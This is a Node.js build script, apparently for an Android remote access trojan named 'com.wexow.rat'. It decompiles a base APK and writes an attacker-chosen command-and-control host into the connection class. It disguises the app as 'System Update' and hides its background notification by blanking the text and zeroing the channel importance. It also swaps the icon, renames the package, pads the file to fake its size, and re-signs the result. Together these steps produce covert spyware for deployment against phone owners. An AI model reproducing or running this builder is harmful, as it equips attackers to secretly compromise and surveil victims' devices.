const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ═══════════════════════════════════════════════════════════════
// Default Configuration
// ═══════════════════════════════════════════════════════════════
let config = {
    hosts: "127.0.0.1:7777",
    appName: "System Update",
    appVersion: "1.0",
    packageName: "com.wexow.rat",
    notifTitle: "",          
    notifText: "",           
    notifEnabled: false,     
    fakeSize: 0,
    icon: null,
    permissions: "ALL"
};

if (process.argv[2] === '--config') {
    const configPath = process.argv[3];
    if (fs.existsSync(configPath)) {
        config = { ...config, ...JSON.parse(fs.readFileSync(configPath, 'utf8')) };
    }
} else if (process.argv[2] && process.argv[3]) {
    config.hosts = `${process.argv[2]}:${process.argv[3]}`;
}

const workDir = 'workdir';
const outputDir = 'output';

try {
    console.log("═══════════════════════════════════════════════════════");
    console.log("   APK Builder");
    console.log("═══════════════════════════════════════════════════════");
    console.log(`AppName:      ${config.appName}`);
    console.log(`Package:      ${config.packageName}`);
    console.log(`Hosts:        ${config.hosts}`);
    console.log(`Notification: ${config.notifEnabled ? 'VISIBLE' : 'HIDDEN'}`);
    if (config.notifEnabled) {
        console.log(`  Title:      ${JSON.stringify(config.notifTitle || config.appName)}`);
        console.log(`  Text:       ${JSON.stringify(config.notifText)}`);
    }
    console.log("═══════════════════════════════════════════════════════");

    if (!fs.existsSync('base.apk')) {
        throw new Error("base.apk not found!");
    }

    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir);

    // ═══════════════════════════════════════════════════════════
    // 1. Decompile
    // ═══════════════════════════════════════════════════════════
    console.log("\n> [1/8] Decompiling base.apk...");
    execSync(`apktool d base.apk -o ${workDir} -f`, { stdio: 'inherit' });

    const smaliDirs = fs.readdirSync(workDir).filter(d => d.startsWith('smali'));

    // ═══════════════════════════════════════════════════════════
    // 2. Patch ConnectionManager (HOST + PORT)
    // ═══════════════════════════════════════════════════════════
    console.log("\n> [2/8] Patching ConnectionManager...");
    let connSmaliPath = null;
    for (const sDir of smaliDirs) {
        const p = path.join(workDir, sDir, 'com/wexow/rat/core/ConnectionManager.smali');
        if (fs.existsSync(p)) {
            connSmaliPath = p;
            break;
        }
    }

    if (connSmaliPath) {
        let content = fs.readFileSync(connSmaliPath, 'utf8');

        let host = config.hosts;
        host = host.replace(/^https?:\/\//, '').replace(/^wss?:\/\//, '');
        host = host.replace(/:\d+.*$/, '');
        host = host.replace(/\/.*$/, '');
        const port = 443;

        console.log(`  - HOST = "${host}"`);
        console.log(`  - PORT = ${port}`);

        content = content.replace(
            /const-string v(\d+), ".*"\s+sput-object v\1, Lcom\/wexow\/rat\/core\/ConnectionManager;->HOST:Ljava\/lang\/String;/,
            (match, reg) => `const-string v${reg}, "${host}"\n    sput-object v${reg}, Lcom/wexow/rat/core/ConnectionManager;->HOST:Ljava/lang/String;`
        );

        const portHex = "0x" + port.toString(16);
        content = content.replace(
            /const\/16 v(\d+), .*\s+sput v\1, Lcom\/wexow\/rat\/core\/ConnectionManager;->PORT:I/,
            (match, reg) => `const/16 v${reg}, ${portHex}\n    sput v${reg}, Lcom/wexow/rat/core/ConnectionManager;->PORT:I`
        );

        fs.writeFileSync(connSmaliPath, content);
    } else {
        console.warn("  ! ConnectionManager.smali not found.");
    }

    // ═══════════════════════════════════════════════════════════
    // 3. Patch strings.xml (app_name)
    // ═══════════════════════════════════════════════════════════
    console.log("\n> [3/8] Patching strings.xml...");
    const stringsPath = path.join(workDir, 'res/values/strings.xml');
    if (fs.existsSync(stringsPath)) {
        let content = fs.readFileSync(stringsPath, 'utf8');
        content = content.replace(
            /<string name="app_name">.*?<\/string>/,
            `<string name="app_name">${config.appName}</string>`
        );
        fs.writeFileSync(stringsPath, content);
    }

    // ═══════════════════════════════════════════════════════════
    // 4. Patch apktool.yml (versionName)
    // ═══════════════════════════════════════════════════════════
    console.log("\n> [4/8] Patching apktool.yml...");
    const apktoolYamlPath = path.join(workDir, 'apktool.yml');
    if (fs.existsSync(apktoolYamlPath)) {
        let content = fs.readFileSync(apktoolYamlPath, 'utf8');
        content = content.replace(/versionName: .*/, `versionName: ${config.appVersion}`);
        fs.writeFileSync(apktoolYamlPath, content);
    }

    // ═══════════════════════════════════════════════════════════
    // 5. Patch MainService.smali (Notification Control)
    // ═══════════════════════════════════════════════════════════
    console.log("\n> [5/8] Patching MainService.smali for notification...");
    
    let mainServiceSmaliPath = null;
    for (const sDir of smaliDirs) {
        const p = path.join(workDir, sDir, 'com/wexow/rat/core/MainService.smali');
        if (fs.existsSync(p)) {
            mainServiceSmaliPath = p;
            break;
        }
    }

    if (mainServiceSmaliPath) {
        let content = fs.readFileSync(mainServiceSmaliPath, 'utf8');
        let patchCount = 0;

        const newTitle = config.notifEnabled ? (config.notifTitle || config.appName) : '';
        const newText = config.notifEnabled ? config.notifText : '';

        const lines = content.split('\n');
        
        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            
            const isTitle = line.includes('->setContentTitle(');
            const isText = line.includes('->setContentText(');
            
            if (!isTitle && !isText) continue;
            
            const newValue = isTitle ? newTitle : newText;
            const methodName = isTitle ? 'setContentTitle' : 'setContentText';
            
            let foundIndex = -1;
            for (let j = i - 1; j >= Math.max(0, i - 15); j--) {
                const prevLine = lines[j];
                
                if (prevLine.includes('const-string')) {
                    foundIndex = j;
                    break;
                }
                
                if (prevLine.includes('.method') || prevLine.includes('.end method')) {
                    break;
                }
            }
            
            if (foundIndex >= 0) {
                const oldLine = lines[foundIndex];
                const indent = oldLine.match(/^\s*/)[0];
                const regMatch = oldLine.match(/const-string v(\d+)/);
                
                if (regMatch) {
                    const reg = regMatch[1];
                    const escaped = newValue
                        .replace(/\\/g, '\\\\')
                        .replace(/"/g, '\\"')
                        .replace(/\n/g, '\\n');
                    
                    lines[foundIndex] = `${indent}const-string v${reg}, "${escaped}"`;
                    patchCount++;
                    
                    console.log(`  - ${methodName}: → "${newValue}"`);
                }
            } else {
                console.log(`  - ${methodName}: const-string not found nearby (line ${i + 1})`);
            }
        }

        const importance = config.notifEnabled ? 1 : 0;
        const newLines2 = [];
        
        for (let i = 0; i < lines.length; i++) {
            let line = lines[i];
            
            if (/const\/4 v\d+, 0x1/.test(line)) {
                for (let j = i + 1; j <= Math.min(i + 5, lines.length - 1); j++) {
                    if (lines[j].includes('NotificationChannel;-><init>')) {
                        const newHex = '0x' + importance.toString(16);
                        line = line.replace(/const\/4 v(\d+), 0x1/, `const/4 v$1, ${newHex}`);
                        patchCount++;
                        console.log(`  - IMPORTANCE → ${importance} (${newHex})`);
                        break;
                    }
                }
            }
            
            newLines2.push(line);
        }

        const finalContent = newLines2.join('\n');
        fs.writeFileSync(mainServiceSmaliPath, finalContent);
        
        console.log(`  ✅ Total notification patches: ${patchCount}`);
        
        if (patchCount === 0) {
            console.log(`  ⚠️  No patches applied`);
        }
    } else {
        console.warn("  ! Warning: MainService.smali not found.");
    }

    // ═══════════════════════════════════════════════════════════
    // 6. Handle Icon replacement
    // ═══════════════════════════════════════════════════════════
    if (config.icon) {
        console.log("\n> [6/8] Injecting custom icon...");
        const iconData = config.icon.split(';base64,').pop();
        const iconBuffer = Buffer.from(iconData, 'base64');
        const resDir = path.join(workDir, 'res');
        const allResDirs = fs.readdirSync(resDir);

        allResDirs.forEach(dir => {
            if (dir.startsWith('mipmap-')) {
                const dirPath = path.join(resDir, dir);
                const pngFiles = ['ic_launcher.png', 'ic_launcher_round.png'];
                pngFiles.forEach(f => {
                    const p = path.join(dirPath, f);
                    if (fs.existsSync(p)) {
                        fs.writeFileSync(p, iconBuffer);
                    }
                });

                const xmlFiles = ['ic_launcher.xml', 'ic_launcher_round.xml'];
                xmlFiles.forEach(f => {
                    const xmlPath = path.join(dirPath, f);
                    if (fs.existsSync(xmlPath)) {
                        fs.unlinkSync(xmlPath);
                    }
                });
            }
        });
    }

    // ═══════════════════════════════════════════════════════════
    // 7. Patch Package Name
    // ═══════════════════════════════════════════════════════════
    const oldPkg = "com.wexow.rat";
    if (config.packageName !== oldPkg) {
        console.log(`\n> [7/8] Changing package name to ${config.packageName}...`);
        const newPkg = config.packageName;
        const oldPath = oldPkg.replace(/\./g, '/');
        const newPath = newPkg.replace(/\./g, '/');

        let manifestPath = path.join(workDir, 'AndroidManifest.xml');
        let manifest = fs.readFileSync(manifestPath, 'utf8');
        manifest = manifest.replace(new RegExp(`package="${oldPkg}"`, 'g'), `package="${newPkg}"`);
        manifest = manifest.replace(new RegExp(`"${oldPkg}`, 'g'), `"${newPkg}`);
        manifest = manifest.replace(new RegExp(`>${oldPkg}`, 'g'), `>${newPkg}`);
        fs.writeFileSync(manifestPath, manifest);

        smaliDirs.forEach(sDir => {
            const fullPath = path.join(workDir, sDir);
            execSync(`grep -rli "L${oldPath}" ${fullPath} | xargs -r sed -i 's|L${oldPath}|L${newPath}|g'`);
            execSync(`grep -rli "${oldPkg}" ${fullPath} | xargs -r sed -i 's|${oldPkg}|${newPkg}|g'`);
        });

        const resSubDirs = ['layout', 'xml', 'values', 'menu'];
        resSubDirs.forEach(sub => {
            const subPath = path.join(workDir, 'res', sub);
            if (fs.existsSync(subPath)) {
                execSync(`grep -rli "${oldPkg}" ${subPath} | xargs -r sed -i 's|${oldPkg}|${newPkg}|g'`);
            }
        });

        smaliDirs.forEach(sDir => {
            const rootSmali = path.join(workDir, sDir);
            const oldDirFull = path.join(rootSmali, oldPath);
            const newDirFull = path.join(rootSmali, newPath);
            if (fs.existsSync(oldDirFull)) {
                fs.mkdirSync(newDirFull, { recursive: true });
                execSync(`cp -r ${oldDirFull}/* ${newDirFull}/ 2>/dev/null || true`);
                execSync(`rm -rf ${oldDirFull}`);

                let currentDir = path.dirname(oldDirFull);
                while (currentDir !== rootSmali && currentDir.length > rootSmali.length) {
                    if (fs.existsSync(currentDir) && fs.readdirSync(currentDir).length === 0) {
                        fs.rmdirSync(currentDir);
                        currentDir = path.dirname(currentDir);
                    } else {
                        break;
                    }
                }
            }
        });
    }

    // ═══════════════════════════════════════════════════════════
    // 8. Fake Size
    // ═══════════════════════════════════════════════════════════
    if (config.fakeSize > 0) {
        console.log(`\n> [8/8] Bloating APK by ${config.fakeSize} MB...`);
        const paddingDir = path.join(workDir, 'assets/padding');
        if (!fs.existsSync(paddingDir)) fs.mkdirSync(paddingDir, { recursive: true });
        const paddingFile = path.join(paddingDir, 'data.bin');
        const sizeInBytes = config.fakeSize * 1024 * 1024;
        const buffer = crypto.randomBytes(sizeInBytes);
        fs.writeFileSync(paddingFile, buffer);
    }

    // ═══════════════════════════════════════════════════════════
    // Rebuild + Sign + Zipalign
    // ═══════════════════════════════════════════════════════════
    const patchedApk = path.join(outputDir, 'patched.apk');
    console.log("\n> Rebuilding APK...");
    execSync(`apktool b ${workDir} -o ${patchedApk}`, { stdio: 'inherit' });

    console.log("\n> Signing APK...");
    if (!fs.existsSync('debug.keystore')) {
        execSync(`keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US"`);
    }
    execSync(`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android ${patchedApk} androiddebugkey`);

    const finalApk = path.join(outputDir, 'Wexow.apk');
    console.log("> Zipaligning...");
    execSync(`zipalign -v -f 4 ${patchedApk} ${finalApk}`);

    console.log("\n═══════════════════════════════════════════════════════");
    console.log("   ✅ BUILD SUCCESS: " + finalApk);
    console.log("═══════════════════════════════════════════════════════");

} catch (err) {
    console.error("\n═══════════════════════════════════════════════════════");
    console.error("   ❌ BUILD FAILED:", err.message);
    console.error("═══════════════════════════════════════════════════════");
    process.exit(1);
}